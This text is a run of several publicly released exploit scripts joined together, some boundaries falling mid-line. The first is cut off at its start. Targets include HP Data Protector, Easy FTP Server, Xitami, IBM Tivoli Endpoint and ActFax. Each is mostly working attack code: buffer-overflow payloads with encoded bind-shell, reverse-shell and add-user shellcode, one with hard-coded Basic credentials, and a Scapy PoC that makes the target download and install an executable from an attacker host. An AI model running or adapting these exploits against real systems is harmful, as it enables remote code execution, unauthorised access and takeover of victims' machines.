"\x55\x54\x48\x4f\x52\x49\x54\x59\x00\x20\x4e\x54\x41\x55\x54\x48"
"\x4f\x52\x49\x54\x59\x00\x20\x4e\x54\x41\x55\x54\x48\x4f\x52\x49"
"\x54\x59\x00\x20\x30\x00\x20\x30\x00\x20\x2e\x2e\x2f\x2e\x2e\x2f"
"\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e"
"\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x5c\x77\x69\x6e\x64\x6f\x77\x73"
"\x5c\x73\x79\x73\x74\x65\x6d\x33\x32\x5c\x69\x70\x63\x6f\x6e\x66"
"\x69\x67\x2e\x65\x78\x65\x00\x00")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print "Sending payload"
s.send(payload)

while 1:
        data = s.recv(4096)
        if data:
                print data
        else:
                break

s.close()
# Exploit Title: HP Data Protector Cliet EXEC_SETUP Remote Code Execution Vulnerability PoC (ZDI-11-056)
# Date: 2011-05-29
# Author: @fdiskyou
# e-mail: rui at deniable.org
# Version: 6.11
# Tested on: Windows 2003 Server SP2 en
# CVE: CVE-2011-0922 
# Notes: ZDI-11-056
# Reference: http://www.zerodayinitiative.com/advisories/ZDI-11-056/ 
# Reference: http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02781143
#
# The following PoC instructs an HP Data Protector Client to download and install an .exe file. It tries to get the file 
# from a share (\\pwn2003se.home.it) and if it fails it tries to access the same file via HTTP. To get the PoC working with 
# this payload share a malicious file via HTTP under http://pwn2003se.home.it/Omniback/i386/installservice.exe.exe and you are done. 
# Tweak payload to better suit your needs.
#
# Since you're crafting packets with Scapy don't forget to use iptables to block the outbound resets or your host will 
# reset your connection after receiving and unsolicited SYN/ACK that is not associated with any open session/socket. Have Fun.
# 
# Greetz to all the Exploit-DB Dev Team.
 
from scapy.all import *
 
if len(sys.argv) != 2:
    print "Usage: ./ZDI-11-056.py <Target IP>"
    sys.exit(1)

target = sys.argv[1]

payload = ("\x00\x00\x01\xbe"
"\xff\xfe\x32\x00\x00\x00\x20\x00\x70\x00\x77\x00\x6e\x00\x32\x00"
"\x30\x00\x30\x00\x33\x00\x73\x00\x65\x00\x2e\x00\x68\x00\x6f\x00"
"\x6d\x00\x65\x00\x2e\x00\x69\x00\x74\x00\x00\x00\x20\x00\x30\x00"
"\x00\x00\x20\x00\x53\x00\x59\x00\x53\x00\x54\x00\x45\x00\x4d\x00"
"\x00\x00\x20\x00\x4e\x00\x54\x00\x20\x00\x41\x00\x55\x00\x54\x00"
"\x48\x00\x4f\x00\x52\x00\x49\x00\x54\x00\x59\x00\x00\x00\x20\x00"
"\x43\x00\x00\x00\x20\x00\x32\x00\x36\x00\x00\x00\x20\x00\x5c\x00"
"\x5c\x00\x70\x00\x77\x00\x6e\x00\x32\x00\x30\x00\x30\x00\x33\x00"
"\x53\x00\x45\x00\x2e\x00\x68\x00\x6f\x00\x6d\x00\x65\x00\x2e\x00"
"\x69\x00\x74\x00\x5c\x00\x4f\x00\x6d\x00\x6e\x00\x69\x00\x62\x00"
"\x61\x00\x63\x00\x6b\x00\x5c\x00\x69\x00\x33\x00\x38\x00\x36\x00"
"\x5c\x00\x69\x00\x6e\x00\x73\x00\x74\x00\x61\x00\x6c\x00\x6c\x00"
"\x73\x00\x65\x00\x72\x00\x76\x00\x69\x00\x63\x00\x65\x00\x2e\x00"
"\x65\x00\x78\x00\x65\x00\x20\x00\x2d\x00\x73\x00\x6f\x00\x75\x00"
"\x72\x00\x63\x00\x65\x00\x20\x00\x5c\x00\x5c\x00\x70\x00\x77\x00"
"\x6e\x00\x32\x00\x30\x00\x30\x00\x33\x00\x53\x00\x45\x00\x2e\x00"
"\x68\x00\x6f\x00\x6d\x00\x65\x00\x2e\x00\x69\x00\x74\x00\x5c\x00"
"\x4f\x00\x6d\x00\x6e\x00\x69\x00\x62\x00\x61\x00\x63\x00\x6b\x00"
"\x20\x00\x00\x00\x20\x00\x5c\x00\x5c\x00\x70\x00\x77\x00\x4e\x00"
"\x32\x00\x30\x00\x30\x00\x33\x00\x53\x00\x45\x00\x5c\x00\x4f\x00"
"\x6d\x00\x6e\x00\x69\x00\x62\x00\x61\x00\x63\x00\x6b\x00\x5c\x00"
"\x69\x00\x33\x00\x38\x00\x36\x00\x5c\x00\x69\x00\x6e\x00\x73\x00"
"\x74\x00\x61\x00\x6c\x00\x6c\x00\x73\x00\x65\x00\x72\x00\x76\x00"
"\x69\x00\x63\x00\x65\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x20\x00"
"\x2d\x00\x73\x00\x6f\x00\x75\x00\x72\x00\x63\x00\x65\x00\x20\x00"
"\x5c\x00\x5c\x00\x70\x00\x77\x00\x4e\x00\x32\x00\x30\x00\x30\x00"
"\x33\x00\x53\x00\x45\x00\x5c\x00\x4f\x00\x6d\x00\x6e\x00\x69\x00"
"\x62\x00\x61\x00\x63\x00\x6b\x00\x20\x00\x00\x00\x00\x00\x00\x00"
"\x02\x54"
"\xff\xfe\x32\x00\x36\x00\x00\x00\x20\x00\x5b\x00\x30\x00\x5d\x00"
"\x41\x00\x44\x00\x44\x00\x2f\x00\x55\x00\x50\x00\x47\x00\x52\x00"
"\x41\x00\x44\x00\x45\x00\x0a\x00\x5c\x00\x5c\x00\x70\x00\x77\x00"
"\x6e\x00\x32\x00\x30\x00\x30\x00\x33\x00\x53\x00\x45\x00\x2e\x00"
"\x68\x00\x6f\x00\x6d\x00\x65\x00\x2e\x00\x69\x00\x74\x00\x5c\x00"
"\x4f\x00\x6d\x00\x6e\x00\x69\x00\x62\x00\x61\x00\x63\x00\x6b\x00"
"\x5c\x00\x69\x00\x33\x00\x38\x00\x36\x00\x0a\x00\x49\x00\x4e\x00"
"\x53\x00\x54\x00\x41\x00\x4c\x00\x4c\x00\x41\x00\x54\x00\x49\x00"
"\x4f\x00\x4e\x00\x54\x00\x59\x00\x50\x00\x45\x00\x3d\x00\x22\x00"
"\x43\x00\x6c\x00\x69\x00\x65\x00\x6e\x00\x74\x00\x22\x00\x20\x00"
"\x43\x00\x45\x00\x4c\x00\x4c\x00\x4e\x00\x41\x00\x4d\x00\x45\x00"
"\x3d\x00\x22\x00\x70\x00\x77\x00\x6e\x00\x32\x00\x30\x00\x30\x00"
"\x33\x00\x73\x00\x65\x00\x2e\x00\x68\x00\x6f\x00\x6d\x00\x65\x00"
"\x2e\x00\x69\x00\x74\x00\x22\x00\x20\x00\x43\x00\x45\x00\x4c\x00"
"\x4c\x00\x43\x00\x4c\x00\x49\x00\x45\x00\x4e\x00\x54\x00\x4e\x00"
"\x41\x00\x4d\x00\x45\x00\x3d\x00\x22\x00\x73\x00\x65\x00\x63\x00"
"\x75\x00\x72\x00\x6e\x00\x65\x00\x74\x00\x2d\x00\x62\x00\x32\x00"
"\x75\x00\x64\x00\x66\x00\x76\x00\x2e\x00\x68\x00\x6f\x00\x6d\x00"
"\x65\x00\x2e\x00\x69\x00\x74\x00\x22\x00\x20\x00\x41\x00\x4c\x00"
"\x4c\x00\x55\x00\x53\x00\x45\x00\x52\x00\x53\x00\x3d\x00\x35\x00"
"\x20\x00\x49\x00\x4e\x00\x53\x00\x54\x00\x41\x00\x4c\x00\x4c\x00"
"\x44\x00\x49\x00\x52\x00\x3d\x00\x22\x00\x24\x00\x28\x00\x4f\x00"
"\x4d\x00\x4e\x00\x49\x00\x42\x00\x41\x00\x43\x00\x4b\x00\x29\x00"
"\x5c\x00\x22\x00\x20\x00\x50\x00\x52\x00\x4f\x00\x47\x00\x52\x00"
"\x41\x00\x4d\x00\x44\x00\x41\x00\x54\x00\x41\x00\x3d\x00\x22\x00"
"\x24\x00\x28\x00\x44\x00\x41\x00\x54\x00\x41\x00\x4f\x00\x4d\x00"
"\x4e\x00\x49\x00\x42\x00\x41\x00\x43\x00\x4b\x00\x29\x00\x5c\x00"
"\x22\x00\x20\x00\x49\x00\x4e\x00\x45\x00\x54\x00\x50\x00\x4f\x00"
"\x52\x00\x54\x00\x3d\x00\x35\x00\x35\x00\x35\x00\x35\x00\x20\x00"
"\x41\x00\x44\x00\x44\x00\x4c\x00\x4f\x00\x43\x00\x41\x00\x4c\x00"
"\x3d\x00\x63\x00\x6f\x00\x72\x00\x65\x00\x2c\x00\x6a\x00\x61\x00"
"\x76\x00\x61\x00\x67\x00\x75\x00\x69\x00\x20\x00\x4f\x00\x50\x00"
"\x54\x00\x5f\x00\x44\x00\x4e\x00\x53\x00\x43\x00\x48\x00\x45\x00"
"\x43\x00\x4b\x00\x3d\x00\x31\x00\x20\x00\x4f\x00\x50\x00\x54\x00"
"\x5f\x00\x53\x00\x4b\x00\x49\x00\x50\x00\x49\x00\x4d\x00\x50\x00"
"\x4f\x00\x52\x00\x54\x00\x3d\x00\x31\x00\x20\x00\x4f\x00\x50\x00"
"\x54\x00\x5f\x00\x4d\x00\x53\x00\x47\x00\x3d\x00\x31\x00\x0a\x00"
"\x00\x00\x00\x00")
 
ip=IP(dst=target)
SYN=TCP(sport=31337, dport=5555, flags="S")
packet=ip/SYN
SYNACK=sr1(packet)

my_ack = SYNACK.seq + 1
print SYNACK.seq
print my_ack
ACK=TCP(sport=31337, dport=5555, flags="A", seq=1, ack=my_ack)
send(ip/ACK)

PUSH=TCP(sport=31337, dport=5555, flags="PA", seq=1, ack=my_ack)
send(ip/PUSH/payload)
#!/usr/bin/python

# Title: Easy~Ftp Server v1.7.0.2 Post-Authentication BoF
# Original Author: dookie2000ca || Windows XP SP3 Professional
# Author: b33f - Ruben Boonen
# Windows XP Home SP1
# Software link: http://cdnetworks-us-2.dl.sourceforge.net/project/easyftpsvr/easyftpsvr/1.7.0.2-en/easyftpsvr-1.7.0.2.zip

import socket
import sys

#-------------------------------------------------------------------------------
#SE Handler is overwritten - offset to SEH 256
#short jump \xEB\x07
#pop pop ret rpcrt4.dll 78011926
#badchars 0x00 0x0a 0x2f 0x5c
#-------------------------------------------------------------------------------

bunny = (
"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
"\x77\x30\x30\x74" # egghunter marker w00t
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")

#win32_adduser - PASS=u EXITFUNC=seh USER=fuck Size=228 Encoder=ShikataGaNai
shellcode = (
"\xdb\xd3\x31\xc9\xb8\x5d\x82\xf8\x52\xb1\x34\xd9\x74\x24\xf4\x5f"
"\x83\xc7\x04\x31\x47\x13\x03\x1a\x91\x1a\xa7\x58\x7d\x9e\x48\xa0"
"\x7e\x94\x0c\x9c\xf5\xd6\x8b\xa4\x08\xc8\x1f\x1b\x13\x9d\x7f\x83"
"\x22\x4a\x36\x48\x10\x07\xc8\xa0\x68\xd7\x52\x90\x0f\x17\x10\xef"
"\xce\x52\xd4\xee\x12\x89\x13\xcb\xc6\x6a\xd8\x5e\x02\xf9\xbf\x84"
"\xcd\x15\x59\x4f\xc1\xa2\x2d\x10\xc6\x35\xd9\x25\xea\xbe\x1c\xd2"
"\x9a\x9d\x3a\x20\x5e\x2c\x83\x4c\xeb\x0f\x33\x09\x2b\xf7\x3f\x9a"
"\xec\x04\xcb\xec\xf0\xb9\x40\x64\x01\x29\x5f\xff\x91\x1d\x60\xff"
"\x91\xd6\x09\xc3\xce\xd9\x3f\x5b\xa7\x90\x38\x18\x87\xd8\xe8\x76"
"\xf8\x95\x0d\xd9\x90\x31\xf3\x6f\x6e\x15\xf3\x88\x0c\xf4\x6f\x78"
"\xb6\x7e\x15\xa4\x17\x1c\xf5\xca\x02\x96\xd5\x67\xbe\x33\x64\xa7"
"\x26\xc9\xeb\xcc\x86\x44\xcc\x3d\x86\xe2\x48\x61\x2e\xcd\x70\x0f"
"\x4b\x65\x51\xa3\xfc\xe6\xf0\x57\x64\x9b\x9d\xd2\x1a\x7b\x23\x78"
"\xb6\x12\xcd\xe9\x3b\x91\x63\x88\xcf\x36\xf6\x39\x10\xaf\x83\xde"
"\x3b\x0f\x43\x61\xf8\x0b\x9b")

payload = "A"*7 + "w00tw00t" + shellcode + "A"*10 + "\xEB\x07\x90\x90" + "\x26\x19\x01\x78" + "\x90"*25 + bunny + "A"*133

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.1.70',21))
s.recv(1024)
s.send('USER b33f\r\n')
s.recv(1024)
s.send('PASS b33f\r\n')
s.recv(1024)
s.send('MKD ' + payload + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close# Exploit Title: Xitami Web Server 2.5 Remote Buffer Overflow (Egghunter)
# Date: June 4, 2011
# Author: Glafkos Charalambous
# Version: 2.5b4
# Tested on: Windows XP SP3 En
# Discovered by: Krystian Kloskowski
#
# root@bt:~/Desktop# python xitami.py 192.168.0.24 80
# [+] Connected
# [+] Sending payload...
# [+] Check Port 1337 for your shell
# root@bt:~/Desktop# telnet 192.168.0.24 1337
# Trying 192.168.0.24...
# Connected to 192.168.0.24.
# Escape character is '^]'.
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\Xitami>ipconfig
# ipconfig
#
# Windows IP Configuration
#
#
# Ethernet adapter Local Area Connection:
#
#        Connection-specific DNS Suffix  . : 
#        IP Address. . . . . . . . . . . . : 192.168.0.24
#        Subnet Mask . . . . . . . . . . . : 255.255.255.0
#        Default Gateway . . . . . . . . . : 192.168.0.1
#
# C:\Xitami>

import time
import socket
import sys

if len(sys.argv) != 3:
    print "Usage: ./xitami.py <Target IP> <Target Port>"
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])

egghunt = ("\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02"
"\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
"w00t" # 4 byte tag
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")

# ./msfpayload windows/shell_bind_tcp lport=1337 exitfunc=process R | ./msfencode -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -c 7 -t c
shellcode = ("\xba\xa2\xcf\xad\x8d\xdb\xd1\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x7e\x83\xee\xfc\x31\x56\x11\x03\x56\x11\xe2\x57\x70\xe4\x08"
"\x09\x2d\x2e\xd1\xec\x46\xf5\x22\x56\x96\x3c\x7b\x1e\x5b\x7e"
"\x78\xef\x23\x71\x82\x3e\x5f\xf1\xd3\x58\x3b\x53\x30\xe6\xbc"
"\x82\xb3\xba\xf5\xdf\x9e\x21\x78\xcd\x8d\x25\x87\x5b\xd4\xfd"
"\x6c\xcd\xcf\x7b\x68\x84\x3d\x07\xcb\x1e\x1b\x06\x11\x31\xfd"
"\x90\x27\xff\xe6\x22\x4d\xdd\x1a\xc9\xe1\x93\x45\x4b\x13\x48"
"\x74\xcc\x45\x07\x95\xd1\x38\xde\xa3\xef\x7d\x68\xb0\xd1\x67"
"\x60\xe5\x89\xb5\xf7\x3e\x2f\x49\xd7\xb8\xc0\xc6\x1b\xfc\xe2"
"\xbb\xc8\xae\x39\x78\x81\x4d\xc4\x1c\x2d\x16\x6d\xc3\x04\xde"
"\x58\x43\x4e\xc5\x60\x46\x4b\xc9\x79\xfb\x32\xdd\x46\xb8\xd4"
"\x61\x62\x92\xf6\xe8\x7b\xe8\x41\xc0\xee\xe2\xbb\x64\x6c\xb8"
"\x43\x2d\xfd\xda\x61\xb0\x7c\xe6\x36\xab\x3e\x7a\x80\xe6\x60"
"\x2b\x52\x1d\x53\xed\xb4\x94\x86\x8b\x66\x26\x56\x67\xe0\x7c"
"\xfb\x1c\xb9\x4f\x75\x4e\x7d\x63\xac\xbc\x7e\x90\xfd\xa1\xb2"
"\x6b\x06\xb4\x92\x1f\x90\x26\x1a\x4f\x3d\x18\xa2\x3c\x72\x0f"
"\x93\x37\xf7\xf3\x5a\x7f\x33\xbf\x9f\xc2\xea\xb9\x13\x6c\x77"
"\xb6\xd4\xc0\x37\x86\x78\xd3\x86\x8c\x9f\x3a\x0f\xb1\x5e\x0f"
"\xb9\x09\xf1\x0c\xe9\x2f\xb7\xd7\xea\x37\x4f\x6a\xc3\xdb\x7b"
"\x48\x32\x05\xd4\x48\xcc\x47\x59\x41\xc5\x0b\xf5\x02\xeb\x06"
"\x7f\xae\x25\x2b\x16\x2d\x51\x18\x91\x9c\x96\x32\x17\x1c\x6e"
"\x95\xb9\x4e\xf5\xa6\x29\x8b\x30\x48\x07\x55\xf1\xe4\xa8\xe2"
"\x4d\xe0\x6a\xef\xd3\x4e\x07\x4d\xb2\x25\xe0\xb2\x33\x1b\xdc"
"\x50\xac\x59\x35\xd9\x91\x9c\x44\x5a\xc1\x52\x19\x0f\x03\xc9"
"\x1d\x71\xe5\x79\x54\x3d\xc0\x87\x4d\x9f\x9d\x69\x09\xd4\x6b"
"\xe2\xa5\xe0\x77\xd0\xb9\xbd\x85\xd0\x35\xcb\x59\x78\x22\xf2"
"\x25\x78\x64\xf6\x2a\x8d\x3e\xc8\xce\x7c\x6f\x64\x24\xb4\x2c"
"\x14\xd5\xff\x9c\x84\x40\xf1\x74\xcf\x3c\x4f\xac\x2c\xe2\xae"
"\xaa\xaf\xb0\xcf\xc8\x31\x30\xb3\xb0\x8b\x08\x25\x2d\x95\x3d"
"\xf5\x0c\x1f\x23\xd9\x87\x31\x79\xd2\x8d\xad\x59\xdd\xb0\x4c"
"\xa4\x17\xeb\x97\xb0\x90\x3c\x45\xb7\x3f\x2b\x04\xf3\xc6\xe8"
"\x56\x25\x7a\xfd\x6e\x3b\xef\x64\x14\x9b\x67\x08\x9c\x47\x73"
"\x24\x1e\x1e\xc6\xd2\xad\xcc\x0c\xc8\xbb\x4e\x12\xde\xf5\x35"
"\x25\xe0\xb0\xef\x04\xb5\x29\x62\xc6\x56\x44\x52\x16\xa3\x63"
"\x63\xcd\xd1\xc9\x45\x87\x3b\xd6\x4b\x7a\x24\xd5\xd4\x7d\x4c"
"\x83\x06\x16\x88\x7f")

jump = "\xeb\x22" # short jump

buf = "A" * 72                  
buf += "\xD7\x30\x9D\x7C" # jmp esp (user32.dll) / XP SP3 English
buf += jump
buf += "\x90" * 50
buf += egghunt
buf += "w00tw00t" # tag
buf += shellcode

header = (
'GET / HTTP/1.1\r\n'
'Host: %s\r\n'
'If-Modified-Since: pwned, %s\r\n'
'\r\n') % (target, buf)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((target, port))
    print "[+] Connected"
except:
    print "[!] Connection Failed"
    sys.exit(0)

print "[+] Sending payload..."
s.send(header)
time.sleep(1)
s.close()

print "[+] Check port 1337 for your shell"

#!/usr/bin/python
# tiv-sys.py
# IBM Tivoli Endpoint 4.1.1 Remote SYSTEM Exploit
# Jeremy Brown [0xjbrown41-gmail-com]
# June 2011
#
# Discovered by: Brian Adeloye of Tenable Network Security
#
# This exploit makes use of two vulnerabilities:
#
# 1) Base64 authentication credentials hard-coded in lcfd.exe
# 2) Stack-based buffer overflow when parsing HTTP variable values
#
# Tested on Tivoli Endpoint 4.1.1-LCF-0048 running on Windows XP SP3
#
# $ python tiv-sys.py 192.168.0.188
# .....
# $ nc -v -l 4444
# Connection from 192.168.0.188 port 4444 [tcp/*] accepted
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\Program Files\Tivoli\lcf\dat\1>
#
# References:
#
# http://www.zerodayinitiative.com/advisories/ZDI-11-169/
# https://www-304.ibm.com/support/docview.wss?uid=swg21499146
#

import sys
import struct
import socket
import httplib
import urllib

port=9495

ret=0x7C96BF33 # jmp esp @ user32.dll
junk="B"*256

# windows/shell_reverse_tcp - 333 bytes
# http://www.metasploit.com
# Encoder: x86/countdown
# LHOST=192.168.0.198, LPORT=4444, ReverseConnectRetries=5, 
# EXITFUNC=thread, InitialAutoRunScript=, AutoRunScript=
payload=(
"\x2b\xc9\x66\xb9\x39\x01\xe8\xff\xff\xff\xff\xc1\x5e\x30"
"\x4c\x0e\x07\xe2\xfa\xfd\xea\x8a\x04\x05\x06\x67\x81\xec"
"\x3b\xd9\x68\x86\x5c\x3f\x9b\x43\x1e\x98\x46\x01\x9d\x65"
"\x30\x16\xad\x51\x3a\x2c\xe1\x2e\xe0\x8d\x1e\x42\x58\x27"
"\x0a\x07\xe9\xe6\x27\x2a\xeb\xcf\xde\x7d\x67\xba\x60\x23"
"\xbf\x77\x0a\x36\xe8\xb2\x7a\x43\xb9\xfd\x4a\x75\x41\x91"
"\x12\xc8\x0c\x5d\xcd\x1f\x68\x48\x99\xa8\x70\x04\xc5\x7b"
"\xdb\x50\x84\x62\xab\x64\x96\xfb\x99\x96\x57\x5a\x9b\x65"
"\xbe\x2a\x94\x62\x1f\x9b\x5f\x18\x42\x12\x8a\x31\xe1\x33"
"\x48\x6c\xbd\x09\xfb\x7d\x39\xf8\x2c\x69\x77\xa4\xf3\x7d"
"\xf1\x7a\xac\xf4\x3a\x5b\xa4\xda\xd9\xe2\xdd\xdf\xd7\x78"
"\x68\xd1\xd5\xd1\x07\x9f\x65\x09\xcd\xf9\xa1\xa1\x94\x95"
"\xfe\xe0\xeb\xab\xc5\xcf\xf4\xd1\xe9\xb9\xa7\x5e\x77\x1b"
"\x34\xa4\xa6\xa7\x81\x6d\xfe\xfb\xc4\x84\x2e\xc4\xb0\x4e"
"\x67\xe3\xe4\xe5\xe6\xf7\xe8\xf9\xea\xd3\x56\xb2\x61\x5f"
"\x3f\x14\x4b\x04\xac\x05\x6e\xc7\x0e\xa1\xc8\xcb\xdd\x91"
"\x47\x29\xba\xc1\x84\x84\xbc\x4c\x73\xa3\xb9\x26\x0f\xb3"
"\xbf\xb0\xba\xdf\x69\x02\xb5\xb4\xb3\xd4\x10\x8d\xfa\xb0"
"\xbc\x09\x11\x8b\x29\xab\xd4\xcd\xf3\xf2\x79\xb1\xd2\xe7"
"\x3e\xf9\xbe\xaf\xac\xab\xa8\xa9\x46\x57\x4c\x55\x52\x56"
"\x50\x6f\x71\xc5\x35\x8d\xf3\xd8\x87\xef\x5e\x47\x54\xec"
"\x24\x7d\x1e\x90\x05\x79\xe5\xce\xa7\xfd\x03\x35\x2a\x49"
"\x84\xb6\x99\xb8\xd9\xf2\x14\x2f\x56\x21\xac\xd6\xce\x5a"
"\x35\x8a\x75\x20\x46\x5a\x5c\x37\x6b\xc6\xef")

if len(sys.argv)<2:
     print "Usage: "+sys.argv[0]+" <target> [port]"
     sys.exit(0)

target=sys.argv[1]
if len(sys.argv)==3:
     port=int(sys.argv[2])

retaddr=struct.pack("<L",ret)

data=urllib.urlencode({"test":junk+retaddr+payload})
size=5+len(junk)+len(retaddr)+len(payload) # 'test=' = 5 (also works with just '=')
hdrs={"Host":"pw.n","Content-Length":size,"Authorization":"Basic dGl2b2xpOmJvc3M="} # tivoli:boss

conn=httplib.HTTPConnection(target,port)
conn.request("POST","/addr",data,hdrs)
conn.close()
#!/usr/bin/python

#-----------------------------------------------------------------------------------
# Exploit Title: ActFax Server FTP Remote BOF (post auth)
# Author: b33f - Ruben Boonen
# Software Link: http://www.actfax.com/download/actfax_setup_en.exe
# Tested on: Windows XP PRO SP3 (version 2002) - VMware Workstation
#-----------------------------------------------------------------------------------
# Credit goes to chap0 for discovering the bug.
# Allot of thanks to PoURaN, for helping a n00b understand assembly better!!!
#-----------------------------------------------------------------------------------
 
import socket
import sys
 
print "\nActFax XP SP3 Pro..."
print "Hunting for alphanumeric code!!\n"

#-----------------------------------------------------------------------------------
# payload => win32_bind LPORT=9988 Size=709 => Encoder=PexAlphaNum
#-----------------------------------------------------------------------------------
shellcode = (
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x46\x4b\x4e"
"\x4d\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x36\x4b\x38"
"\x4e\x56\x46\x32\x46\x52\x4b\x48\x45\x34\x4e\x43\x4b\x38\x4e\x47"
"\x45\x50\x4a\x57\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48"
"\x4f\x55\x42\x32\x41\x30\x4b\x4e\x49\x44\x4b\x48\x46\x33\x4b\x38"
"\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c"
"\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x53\x46\x55\x46\x42\x4a\x42\x45\x47\x45\x4e\x4b\x48"
"\x4f\x35\x46\x52\x41\x30\x4b\x4e\x48\x36\x4b\x58\x4e\x30\x4b\x44"
"\x4b\x58\x4f\x55\x4e\x51\x41\x30\x4b\x4e\x43\x30\x4e\x52\x4b\x38"
"\x49\x58\x4e\x56\x46\x42\x4e\x51\x41\x56\x43\x4c\x41\x33\x4b\x4d"
"\x46\x46\x4b\x48\x43\x34\x42\x43\x4b\x48\x42\x44\x4e\x50\x4b\x38"
"\x42\x47\x4e\x51\x4d\x4a\x4b\x38\x42\x54\x4a\x50\x50\x35\x4a\x56"
"\x50\x38\x50\x54\x50\x30\x4e\x4e\x42\x55\x4f\x4f\x48\x4d\x48\x36"
"\x43\x35\x48\x36\x4a\x56\x43\x33\x44\x33\x4a\x46\x47\x47\x43\x47"
"\x44\x33\x4f\x55\x46\x45\x4f\x4f\x42\x4d\x4a\x56\x4b\x4c\x4d\x4e"
"\x4e\x4f\x4b\x43\x42\x45\x4f\x4f\x48\x4d\x4f\x35\x49\x58\x45\x4e"
"\x48\x56\x41\x48\x4d\x4e\x4a\x30\x44\x50\x45\x35\x4c\x46\x44\x50"
"\x4f\x4f\x42\x4d\x4a\x56\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x55"
"\x4f\x4f\x48\x4d\x43\x45\x43\x55\x43\x55\x43\x45\x43\x55\x43\x44"
"\x43\x35\x43\x44\x43\x45\x4f\x4f\x42\x4d\x48\x36\x4a\x56\x47\x52"
"\x46\x30\x48\x36\x43\x55\x49\x38\x41\x4e\x45\x59\x4a\x36\x46\x4a"
"\x4c\x51\x42\x57\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x56\x42\x31"
"\x41\x45\x45\x45\x4f\x4f\x42\x4d\x4a\x46\x46\x4a\x4d\x4a\x50\x32"
"\x49\x4e\x47\x55\x4f\x4f\x48\x4d\x43\x55\x45\x45\x4f\x4f\x42\x4d"
"\x4a\x56\x45\x4e\x49\x34\x48\x48\x49\x54\x47\x55\x4f\x4f\x48\x4d"
"\x42\x35\x46\x55\x46\x55\x45\x45\x4f\x4f\x42\x4d\x43\x39\x4a\x46"
"\x47\x4e\x49\x47\x48\x4c\x49\x57\x47\x45\x4f\x4f\x48\x4d\x45\x55"
"\x4f\x4f\x42\x4d\x48\x36\x4c\x56\x46\x46\x48\x36\x4a\x46\x43\x46"
"\x4d\x56\x49\x38\x45\x4e\x4c\x46\x42\x45\x49\x35\x49\x42\x4e\x4c"
"\x49\x58\x47\x4e\x4c\x46\x46\x44\x49\x38\x44\x4e\x41\x53\x42\x4c"
"\x43\x4f\x4c\x4a\x50\x4f\x44\x54\x4d\x32\x50\x4f\x44\x44\x4e\x32"
"\x43\x59\x4d\x58\x4c\x57\x4a\x33\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x46"
"\x44\x47\x50\x4f\x43\x4b\x48\x31\x4f\x4f\x45\x37\x46\x44\x4f\x4f"
"\x48\x4d\x4b\x45\x47\x45\x44\x35\x41\x55\x41\x45\x41\x35\x4c\x56"
"\x41\x30\x41\x45\x41\x55\x45\x55\x41\x45\x4f\x4f\x42\x4d\x4a\x36"
"\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x55\x4f\x4f\x48\x4d\x4c\x56"
"\x4f\x4f\x4f\x4f\x47\x43\x4f\x4f\x42\x4d\x4b\x38\x47\x35\x4e\x4f"
"\x43\x38\x46\x4c\x46\x46\x4f\x4f\x48\x4d\x44\x55\x4f\x4f\x42\x4d"
"\x4a\x36\x42\x4f\x4c\x58\x46\x50\x4f\x55\x43\x35\x4f\x4f\x48\x4d"
"\x4f\x4f\x42\x4d\x5a")

#-----------------------------------------------------------------------------------
# ASCII encoded  => Size=52
# Decoded opcode => E9DE140000 - JMP 0178D7A7
#-----------------------------------------------------------------------------------
farjump = (
"\x25\x4A\x4D\x4E\x55"     # AND EAX,554E4D4A
"\x25\x35\x32\x31\x2A"     # AND EAX,2A313235
"\x2D\x55\x55\x55\x5A"     # SUB EAX,5A555555
"\x2D\x55\x55\x55\x5A"     # SUB EAX,5A555555
"\x2D\x56\x55\x55\x5B"     # SUB EAX,5B555556
"\x50"                     # PUSH EAX
"\x25\x4A\x4D\x4E\x55"     # AND EAX,554E4D4A
"\x25\x35\x32\x31\x2A"     # AND EAX,2A313235
"\x2D\x5D\x60\x4E\x55"     # SUB EAX,554E605D
"\x2D\x5D\x60\x4E\x55"     # SUB EAX,554E605D
"\x2D\x5D\x60\x4E\x55"     # SUB EAX,554E605D
"\x50"                     # PUSH EAX
"\xEB\xC1")                # JMP SHORT 0112CAE0 (back to the beginning of ESP,
                           # ESP now points to our decoded far-jump).

